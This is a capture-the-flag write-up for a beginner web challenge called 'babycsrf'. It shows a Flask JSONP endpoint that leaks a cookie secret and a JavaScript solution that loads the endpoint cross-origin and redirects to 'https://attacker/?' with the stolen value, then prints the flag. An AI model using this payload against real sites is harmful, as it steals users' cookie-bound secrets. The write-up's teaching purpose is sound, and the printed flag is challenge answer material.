# babycsrf (Web)

This challenge was intended to help new players learn how to expose HTML solutions and use an admin bot.

## Challenge
The website is a simple Flask application that has a home `/` route and a `/api` route.
```python
from flask import Flask, request

app = Flask(__name__)

with open("home.html") as home:
    HOME_PAGE = home.read()

@app.route("/") # Homepage
def home():
    return HOME_PAGE

@app.route("/api") # JSONP api
def page():
    secret = request.cookies.get("secret", "EXAMPLEFLAG")
    return f"setMessage('irisctf{{{secret}}}');"
```

The homepage `home.html` is a static page that calls the `/api` route to return a secret from cookies.
```html
<!DOCTYPE html>
<html>
    <body>
        <h4>Welcome to my home page!</h4>
        Message of the day: <span id="message">(loading...)</span>
        <script>
window.setMessage = (m) => {
    document.getElementById("message").innerText = m;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "/api";
    document.body.appendChild(s);
}
        </script>
    </body>
</html>
```

## Solution
The intended attack is to include the api endpoint as a `<script>` tag. The `<script>` tag does not require the target page to allow the resource to be shared cross origin, unlike most method to retrieve on a different origin. In addition, the hint says the cookie is set with SameSite=None, so the admin bot will send the cookies with such a request, even if it's not while on the challenge origin!

One can copy the provided homepage to see how to load it:

```js
window.setMessage = (m) => {
    document.location = `https://attacker/?${m}`;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "https://babycsrf-web.chal.irisc.tf/api";
    document.body.appendChild(s);
}
```

Adding this JS to the solve template and sending it to the bot will return the flag.

```
irisctf{jsonp_is_never_the_answer}
```
